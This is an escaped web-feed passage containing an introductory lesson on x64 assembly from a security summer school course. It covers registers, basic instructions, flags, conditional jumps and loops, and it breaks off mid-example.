&lt;p>Tasks for the students to solve. They may be of two types:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Tutorials&lt;/strong> - simpler tasks accompanied by more detailed, walkthrough-like explanations&lt;/li>
&lt;li>&lt;strong>Challenges&lt;/strong> - the good stuff&lt;/li>
&lt;/ul>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;p>Any links or references to extra information.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/assembly-language/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/assembly-language/</guid><description>
&lt;h1 id="introduction">Introduction&lt;/h1>
&lt;p>In the previous 2 sessions you started discovering what binary security looks like.
&lt;a href="../binary-analysis/">Last session&lt;/a> you learnt two very powerful means of investigating and even reverse engineering executables: static and dynamic analysis.
In order to leverage them efficiently, you used Ghidra for static analysis.
Now we&amp;rsquo;ll introduce GDB for dynamic analysis.
You&amp;rsquo;ve most likely noticed that they are able to display the source code of the application.
GDB can do so when said app was compiled with &lt;em>debug symbols&lt;/em>, while Ghidra does not even need debug symbols.
It infers the original C code from its compiled representation (learn more about how Ghidra does this by taking part in the &lt;a href="https://security-summer-school.github.io/binary/static-analysis/#ida-and-ghidra">Binary Security track&lt;/a> next year).
This representation is called &lt;strong>assembly language&lt;/strong>.
Both Ghidra and GDB can display the program&amp;rsquo;s code in assembly language.
Today we will demystify this low-level language and learn to understand it.&lt;/p>
&lt;h1 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h1>
&lt;p>For this session, you need:&lt;/p>
&lt;ul>
&lt;li>a working knowledge of the C programming language and familiarity with pointers&lt;/li>
&lt;li>basic skills with Ghidra and GDB&lt;/li>
&lt;li>understand how an executable file is created, as described in the &lt;a href="../application-lifetime/">Application Lifetime session&lt;/a>&lt;/li>
&lt;li>knowledge of the following means of representing data: ASCII, binary, hexadecimal.
Check out the session on &lt;a href="../data-representation/">Data Representation&lt;/a> for a reminder.&lt;/li>
&lt;/ul>
&lt;h1 id="assembly">Assembly&lt;/h1>
&lt;p>Assembly is a low-level language used as a human-readable representation of instructions executed by the CPU.
There is a one-to-one mapping between the binary code executed by the CPU and Assembly.
Few people write Assembly, but many people are required to read it:&lt;/p>
&lt;ul>
&lt;li>security engineers&lt;/li>
&lt;li>compiler / interpreter developers&lt;/li>
&lt;li>embedded developers&lt;/li>
&lt;li>operating systems developers&lt;/li>
&lt;/ul>
&lt;p>Simply put, if a field is close to CPU it requires (some knowledge of) Assembly.
So let&amp;rsquo;s learn this language!&lt;/p>
&lt;h1 id="registers">Registers&lt;/h1>
&lt;p>You might have already seen the image below.
It shows the various places where data can be kept.
Note that this data can be both non-persistent and persistent.
Non-persistent data is gone once you shut down the computer.
It&amp;rsquo;s kept in all levels from &amp;ldquo;Main Memory&amp;rdquo; upwards.
The &amp;ldquo;Main Memory&amp;rdquo; is simply referred to as &lt;strong>memory&lt;/strong> or RAM.&lt;/p>
&lt;p>Persistent storage refers to data on &lt;strong>disks&lt;/strong>: HDD, SSD, CDs, DVDs, magnetic tapes, even in the cloud (where cloud storage providers also use HDDs, SSDs etc.).
If you shut down your laptop or your mobile phone, your pictures or video games remain unchanged.
This is because they are stored &lt;strong>on your device&amp;rsquo;s disk&lt;/strong>.
We simply refer to persistent storage as &lt;strong>storage&lt;/strong>.
Take note of the difference between &lt;em>storage&lt;/em> and &lt;em>memory&lt;/em>.&lt;/p>
&lt;p>&lt;img src="./assets/memory-hierarchy.png" alt="Memory Hierarchy">&lt;/p>
&lt;p>In most programming languages you can freely access data everywhere up to and including the memory.
In assembly however, you also have access to the &lt;strong>registers&lt;/strong> and can influence the &lt;em>cache&lt;/em>.
We won&amp;rsquo;t be dealing with the cache in this session, but you can read more about them &lt;a href="#caches">at the end of this session&lt;/a>
They are the fastest form of memory available and are implemented &lt;em>inside the CPU&lt;/em>.
We can access data in registers in less than 1 ns (nanoseconds), as opposed to a few dozen ns when fetching data from the RAM.&lt;/p>
&lt;p>Then why not make more registers and only use them instead of RAM?
Registers are fast because they are few in number.
This allows them to be efficiently wired to the CPU&amp;rsquo;s Arithmetic and Logic Unit (ALU), which is responsible for executing basic operations, sch as addition, subtraction, bitwise and, or, shifts etc.
The more registers, the more complex and the less efficient the logic.&lt;/p>
&lt;h2 id="registers-in-an-x64-cpu">Registers in an X64 CPU&lt;/h2>
&lt;p>Registers are like variables with fixed names embedded in the CPU.
They can be assigned values that can be modified via instructions.
There are several types of registers inside a CPU.
All of them can be assigned data and that data can be modified using the assembly-level operations described &lt;a href="#assembly-instructions">further in this session&lt;/a>.&lt;/p>
&lt;p>All registers are &lt;strong>64-bits&lt;/strong> wide.
So they each can store up to 8 bytes of data.&lt;/p>
&lt;h3 id="rip">&lt;code>rip&lt;/code>&lt;/h3>
&lt;p>We&amp;rsquo;ll start with a very special and illusive one: the &lt;strong>instruction pointer&lt;/strong> - &lt;code>rip&lt;/code>.
In &lt;a href="../binary-analysis/">the previous session&lt;/a>, you learned that the code of any process is also in its memory.
In order to read and execute it, the CPU must &amp;ldquo;follow&amp;rdquo; it just like children follow text with their fingers.
The CPU does this using &lt;code>rip&lt;/code>.
This register stores te &lt;strong>address of the currently executed instruction&lt;/strong>.
We will never use this instruction per-se in instructions, but you will see and make use of it in GDB.&lt;/p>
&lt;h3 id="general-purpose-registers">General Purpose Registers&lt;/h3>
&lt;p>Then there are &lt;strong>general purpose registers&lt;/strong>.
As their name implies, they are used to store &lt;em>anything&lt;/em>: addresses, user input, function parameters, data read from files or from the web etc.
Some of them also have some special functions, especially regarding function calls:&lt;/p>
&lt;ul>
&lt;li>&lt;code>rax&lt;/code>: accumulator register&lt;/li>
&lt;li>&lt;code>rbx&lt;/code>: base register&lt;/li>
&lt;li>&lt;code>rcx&lt;/code>: counter register; used with the &lt;a href="#loop">&lt;code>loop&lt;/code>&lt;/a> instruction&lt;/li>
&lt;li>&lt;code>rdx&lt;/code>: data register&lt;/li>
&lt;li>&lt;code>rdi&lt;/code>: destination register&lt;/li>
&lt;li>&lt;code>Rsi&lt;/code>: source register&lt;/li>
&lt;li>&lt;code>r8&lt;/code>, &lt;code>r9&lt;/code> &amp;hellip; &lt;code>r15&lt;/code>: regular registers&lt;/li>
&lt;/ul>
&lt;p>Do not learn them by heart.
And also do not bother with their extra meanings.
We will make use of those only when specified.
Otherwise, treat them as simple variables.&lt;/p>
&lt;h3 id="smaller-registers">Smaller Registers&lt;/h3>
&lt;p>Sometimes you only need to access 32 or 16 or 8 bits out of a 64-bit register.
This is possible by slightly changing the name of the register like so:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">64 bits&lt;/th>
&lt;th style="text-align:center">Lowe 32 bits&lt;/th>
&lt;th style="text-align:center">Lower 16 bits&lt;/th>
&lt;th style="text-align:center">High 8 bits&lt;/th>
&lt;th style="text-align:center">Low 8 bits&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">&lt;code>rax&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>eax&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>ax&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>ah&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>al&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>rdi&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>edi&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>di&lt;/code>&lt;/td>
&lt;td style="text-align:center">unaccessible&lt;/td>
&lt;td style="text-align:center">&lt;code>dil&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>r8&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>r8d&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>r8w&lt;/code>&lt;/td>
&lt;td style="text-align:center">unaccessible&lt;/td>
&lt;td style="text-align:center">&lt;code>r8l&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>The bits contained in each of the above subdivisions are shown in the image below.
It is similar for &lt;code>rdi&lt;/code> and &lt;code>r8&lt;/code>, it&amp;rsquo;s just the names that differ.&lt;/p>
&lt;p>&lt;img src="./assets/rax-subdivisions.svg" alt="rax Subdivisions">&lt;/p>
&lt;p>&lt;code>rbx&lt;/code>, &lt;code>rcx&lt;/code> and &lt;code>rdx&lt;/code> have the same subdivisions as &lt;code>rax&lt;/code>.
&lt;code>rsi&lt;/code> has the same subdivision as &lt;code>rdi&lt;/code>: &lt;code>esi&lt;/code>, &lt;code>si&lt;/code> and &lt;code>sil&lt;/code>.
It doesn&amp;rsquo;t make sense to access 4 bytes of an address.
The lower 2 bytes can be accessed due to historical reasons.
In the 70s, when the first CPU of this family (8086) was launched, it only supported 2-byte addresses.
All registers &lt;code>r9&lt;/code> to &lt;code>r15&lt;/code> have the same subdivisions as &lt;code>r8&lt;/code>.&lt;/p>
&lt;h1 id="assembly-instructions">Assembly Instructions&lt;/h1>
&lt;p>We&amp;rsquo;ve now learned what assembly is theoretically and what registers are, but how do we use them?
Each CPU exposes an &lt;strong>ISA (Instruction Set Architecture)&lt;/strong>: a set of instructions with which to modify and interact with its registers and with the RAM.
There are over 1000 instructions in the x64 ISA.
There are even instructions for efficiently encrypting data.
Find out more about them by enrolling in the &lt;a href="https://github.com/security-summer-school/hardware-sec/">Hardware Assisted Security track&lt;/a>.&lt;/p>
&lt;p>Before we dive into the instructions themselves, it&amp;rsquo;s useful to first look at their generic syntax:&lt;/p>
&lt;pre tabindex="0">&lt;code>instruction_name destination, source
&lt;/code>&lt;/pre>&lt;p>Most Assembly instructions have 2 operands: a source and a destination.
For some operations, such as arithmetic, the destination is also an operand.
The result of each instruction always stored in the destination.&lt;/p>
&lt;p>Below we&amp;rsquo;ll list some fundamental instructions.
We will be using the Intel Assembly syntax.&lt;/p>
&lt;h2 id="mov">&lt;code>mov&lt;/code>&lt;/h2>
&lt;p>&lt;code>mov&lt;/code> is the most basic instruction in Assembly.
It &lt;em>copies&lt;/em> (or &lt;em>moves&lt;/em>) data from the source to the destination.
Also note that comments in Assembly are preceded by &lt;code>;&lt;/code> and that the language is case-insensitive.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">eax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">3&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; eax = 3
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rbx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#a40000">&amp;#34;&lt;/span>&lt;span style="color:#000">SSS&lt;/span> &lt;span style="color:#000">Rulz&lt;/span>&lt;span style="color:#a40000">&amp;#34;&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; place the string &amp;#34;SSS Rulz&amp;#34; in `rbx`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">; This places each byte of the string &amp;#34;SSS Rulz&amp;#34; in rbx.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">r8b&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">bh&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; r8b = bh
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">; The sizes of the operands must be equal (1 byte each in this case).
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="data-manipulation">Data Manipulation&lt;/h2>
&lt;p>Now that we&amp;rsquo;ve learnt how to place data in registers we need to learn how to do math with it.
As you&amp;rsquo;ve seen so far, Assembly instructions are really simple.
Below is a table with the most common and useful arithmetic instructions.
Try to figure out what each example does.
Use the fact that the general anatomy of an instruction is usually &lt;code>instruction destination, source&lt;/code>.
The result is always stored in the &lt;code>destination&lt;/code>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">Instruction&lt;/th>
&lt;th style="text-align:center">Description&lt;/th>
&lt;th style="text-align:center">Examples&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">&lt;code>add &amp;lt;dest&amp;gt;, &amp;lt;src&amp;gt;&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>dest += src&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>add rbx, 5&lt;/code>&lt;br>&lt;code>add r11, 0x99&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>sub &amp;lt;dest&amp;gt;, &amp;lt;src&amp;gt;&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>dest -= src&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>sub ecx, 'a'&lt;/code>&lt;br>&lt;code>sub r9, r8&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>shl &amp;lt;dest&amp;gt;, &amp;lt;bits&amp;gt;&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>dest &amp;lt;&amp;lt;= bits&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>shl rax, 3&lt;/code>&lt;br>&lt;code>shl rdi, cl&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>shr &amp;lt;dest&amp;gt;, &amp;lt;bits&amp;gt;&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>dest &amp;gt;&amp;gt;= bits&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>shr r15, 5&lt;/code>&lt;br>&lt;code>shr rsi, cl&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>and &amp;lt;dest&amp;gt; &amp;lt;src&amp;gt;&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>dest &amp;amp;= src&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>and al, ah&lt;/code>&lt;br>&lt;code>and bx, 13&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>or &amp;lt;dest&amp;gt; &amp;lt;src&amp;gt;&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>dest |= src&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>or r10b, cl&lt;/code>&lt;br>&lt;code>or r14, 0x2000&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>xor &amp;lt;dest&amp;gt; &amp;lt;src&amp;gt;&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>dest ^= src&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>xor ebx, edx&lt;/code>&lt;br>&lt;code>xor rcx, 1&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>inc &amp;lt;dest&amp;gt;&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>dest++&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>inc rsi&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>dec &amp;lt;dest&amp;gt;&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>dest--&lt;/code>&lt;/td>
&lt;td style="text-align:center">&lt;code>dec r10w&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="control-flow">Control Flow&lt;/h2>
&lt;p>Now we know how to do maths and move bits around.
This is all good, but we still can&amp;rsquo;t write full programs.
We need a mechanism similar to &lt;code>if&lt;/code>s from Python and also loops in order to make the code run based on conditions.&lt;/p>
&lt;h3 id="jmp">&lt;code>jmp&lt;/code>&lt;/h3>
&lt;p>The simplest instruction for control flow is the &lt;code>jmp&lt;/code> instruction.
It simply loads an address into the &lt;code>rip&lt;/code> register.
But when Assembly code is generated or written either by the compiler or by us, instructions don&amp;rsquo;t have addresses yet.
These addresses are assigned during the &lt;strong>linking&lt;/strong> or &lt;strong>loading&lt;/strong> phase, as you know from the &lt;a href="../application-lifetime/">Application Lifetime session&lt;/a>.&lt;/p>
&lt;p>For this reason, we use &lt;strong>labels&lt;/strong> as some sort of anchors.
We &lt;code>jmp&lt;/code> to them and then the assembler will replace them with relative addresses which are then replaced with full addresses during linking.
The way in which &lt;code>jmp&lt;/code> and labels function is very simple.
Remember that in the absence of &lt;code>jmp&lt;/code>s, Assembly code is executed linearly just like a script.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">jmp&lt;/span> &lt;span style="color:#000">skip_next_section&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">; Whatever code is here is never executed.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f57900">skip_next_section:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">; Only the code below this label is executed.
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>&lt;strong>Warning&lt;/strong>
Do not confuse labels with functions.
A label does not stop the execution of code when it&amp;rsquo;s reached.
They are simply ignored by anything except for &lt;code>jmp&lt;/code>.&lt;/p>
&lt;/blockquote>
&lt;p>For example, kin the the following code, both instructions are executed in the absence of &lt;code>jmp&lt;/code>s:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f57900">some_label:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rbx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">; rax = 2; rbx = 3
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="eflags">&lt;code>eflags&lt;/code>&lt;/h3>
&lt;p>Each instruction (except for &lt;code>mov&lt;/code>) changes the &lt;strong>inner state of the CPU&lt;/strong>.
In other words, several aspects regarding the result of the instruction are stored in a special register that we cannot access directly, called &lt;code>eflags&lt;/code>.
There are &lt;a href="https://stackoverflow.com/questions/1406783/how-to-read-and-write-x86-flags-registers-directly">instructions&lt;/a> that can set or clear some flags in &lt;code>eflags&lt;/code>, but we cannot write something like &lt;code>mov eflags, 2&lt;/code>.&lt;/p>
&lt;p>As its name implies, each bit in &lt;code>eflags&lt;/code> is a flag that is activated (i.e. set to 1) if a certain condition is true about the result of the last executed instruction.
We won&amp;rsquo;t be using these flags per se with one exception: &lt;code>ZF&lt;/code> - the &lt;strong>zero flag&lt;/strong>.
When active, it means that the result of the last instruction was&amp;hellip; 0, duh!
This is useful for testing if numbers are equal for example.
We&amp;rsquo;ll talk about this in the next section.&lt;/p>
&lt;h3 id="conditional-jumps">Conditional jumps&lt;/h3>
&lt;p>Now we know that there is an internal state of the CPU which is modified by each instruction, except for &lt;code>mov&lt;/code>.
We still need a way to leverage this state.
We can do this via &lt;strong>conditional jumps&lt;/strong>.&lt;/p>
&lt;p>They are like &lt;code>jmp&lt;/code> instructions, but the jump is made only when certain conditions are met.
Otherwise, code execution continues from the next instruction.
The general syntax of a conditional jump is&lt;/p>
&lt;pre tabindex="0">&lt;code>j[n]&amp;lt;cond&amp;gt; jabel
&lt;/code>&lt;/pre>&lt;p>where the letter &lt;code>n&lt;/code> is optional and means the jump will be made if the condition is &lt;strong>not&lt;/strong> met.&lt;/p>
&lt;h4 id="cmp-and-test">&lt;code>cmp&lt;/code> and &lt;code>test&lt;/code>&lt;/h4>
&lt;p>We can use the regular arithmetic instructions that we&amp;rsquo;ve learned so far to modify &lt;code>eflags&lt;/code>.
But this has the drawback of also modifying our data.
It would be great if we had a means to modify &lt;code>eflags&lt;/code> without changing the data that we evaluate.
We can do this using &lt;code>cmp&lt;/code> and &lt;code>test&lt;/code>.&lt;/p>
&lt;p>&lt;code>cmp dest, src&lt;/code> modifies &lt;code>eflags&lt;/code> as if you were &lt;strong>subtracting&lt;/strong> &lt;code>src&lt;/code> from &lt;code>dst&lt;/code>, but without modifying &lt;code>dst&lt;/code>.
This is great for testing if 2 things are equal, or for testing which is greater or lower.&lt;/p>
&lt;p>&lt;code>test dest, src&lt;/code> is similar to &lt;code>cmp&lt;/code>, but modifies &lt;code>eflags&lt;/code> according to the &lt;code>and&lt;/code> instruction.
This comes in handy when we want to check if a register is 0.&lt;/p>
&lt;pre tabindex="0">&lt;code>test rax, rax
jz rax_is_zero
&lt;/code>&lt;/pre>&lt;p>is equivalent to&lt;/p>
&lt;pre tabindex="0">&lt;code>cmp rax, 0
jz rax_is_zero
&lt;/code>&lt;/pre>&lt;p>Now let&amp;rsquo;s have a look at some conditional jumps:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">Conditional jump&lt;/th>
&lt;th style="text-align:center">Meaning&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">&lt;code>jz&lt;/code> / &lt;code>je&lt;/code>&lt;/td>
&lt;td style="text-align:center">Jump if the Zero Flag is active&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>jnz&lt;/code> / &lt;code>jne&lt;/code>&lt;/td>
&lt;td style="text-align:center">Jump if the Zero Flag is not active&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>cmp rax, rbx&lt;/code>&lt;br>&lt;code>j[n]g&lt;/code>&lt;/td>
&lt;td style="text-align:center">Jump if &lt;code>rax&lt;/code> is (not) greater (signed) than &lt;code>rbx&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>cmp rax, rbx&lt;/code>&lt;br>&lt;code>j[n]a&lt;/code>&lt;/td>
&lt;td style="text-align:center">Jump if &lt;code>rax&lt;/code> is (not) greater (unsigned) than &lt;code>rbx&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>cmp rax, rbx&lt;/code>&lt;br>&lt;code>j[n]ge&lt;/code>&lt;/td>
&lt;td style="text-align:center">Jump if &lt;code>rax&lt;/code> is (not) greater (signed) or equal than &lt;code>rbx&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>cmp rax, rbx&lt;/code>&lt;br>&lt;code>j[n]ae&lt;/code>&lt;/td>
&lt;td style="text-align:center">Jump if &lt;code>rax&lt;/code> is (not) greater (unsigned) or equal than &lt;code>rbx&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>cmp rax, rbx&lt;/code>&lt;br>&lt;code>j[n]l&lt;/code>&lt;/td>
&lt;td style="text-align:center">Jump if &lt;code>rax&lt;/code> is (not) lower (signed) than &lt;code>rbx&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>cmp rax, rbx&lt;/code>&lt;br>&lt;code>j[n]b&lt;/code>&lt;/td>
&lt;td style="text-align:center">Jump if &lt;code>rax&lt;/code> is (not) lower (unsigned) than &lt;code>rbx&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>cmp rax, rbx&lt;/code>&lt;br>&lt;code>j[n]le&lt;/code>&lt;/td>
&lt;td style="text-align:center">Jump if &lt;code>rax&lt;/code> is (not) lower (signed) or equal than &lt;code>rbx&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;code>cmp rax, rbx&lt;/code>&lt;br>&lt;code>j[n]be&lt;/code>&lt;/td>
&lt;td style="text-align:center">Jump if &lt;code>rax&lt;/code> is (not) lower (unsigned) or equal than &lt;code>rbx&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="loops">Loops&lt;/h3>
&lt;p>We can create loops simply by combining labels and conditional jumps.
For example, &lt;code>for i in range(0, 10)&lt;/code> from Python is equivalent to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">xor&lt;/span> &lt;span style="color:#000">rcx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">rcx&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; i = rcx; same as mov rcx, 0
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#000">for_loop&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">cmp&lt;/span> &lt;span style="color:#000">rcx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">je&lt;/span> &lt;span style="color:#000">done_loop&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; verify i &amp;lt; 10
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">; The body of the for loop.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">inc&lt;/span> &lt;span style="color:#000">rcx&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; rcx++
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#000">jmp&lt;/span> &lt;span style="color:#000">for_loop&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; re-evaluate the condition
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f57900">done_loop:&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Or alternatively, we can verify &lt;code>rcx &amp;lt; 10&lt;/code> at the end of the loop:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">xor&lt;/span> &lt;span style="color:#000">rcx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">rcx&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f57900">for_loop:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">; The body of the for loop.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">inc&lt;/span> &lt;span style="color:#000">rcx&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; rcx++
